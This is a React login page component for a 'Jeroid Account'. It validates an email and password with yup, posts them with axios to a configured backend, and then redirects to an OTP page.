import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { FaEye, FaEyeSlash } from "react-icons/fa"; // Import eye icons

// Validation schema
const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup
    .string()
    .min(10, "Password must be at least 10 characters") // Corrected to 10 characters
    .max(30, "Password cannot exceed 30 characters")
    .required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false); // State to toggle password visibility
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="home">
      <div className="container">
        <div className="contentSec">
          <div className="titleHome">
            Welcome{" "}
            <span role="img" aria-label="waving hand">
              👋
            </span>
          </div>
          <div className="subtitle">
            Log in to start using your Jeroid Account
          </div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label htmlFor="email">Email Address</label>
              <div className="formInput">
                <input
                  name="email"
                  type="email"
                  placeholder="Enter your email address"
                  required
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />

              <label htmlFor="password">Password</label>
              <div className="formInput">
                <input
                  name="password"
                  type={showPassword ? "text" : "password"} // Conditional input type
                  placeholder="Enter your password"
                  required
                  {...register("password")}
                />
                <div
                  onClick={togglePasswordVisibility}
                  className="password-toggle-icon"
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}{" "}
                  {/* Toggle icon */}
                </div>
              </div>
              <FormErrMsg errors={errors} inputName="password" />

              <div className="fg">
                <div className="chBox">
                  <input type="checkbox" />
                  <span>Remember Me</span>
                </div>
                <div className="forgPass">Forgot Password?</div>
              </div>

              <button type="submit" className="homeBtn" disabled={loading}>
                {loading ? "Loading..." : "Log In"}
              </button>

              <div className="donthave">
                Don't have an account? <b>Sign Up</b>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
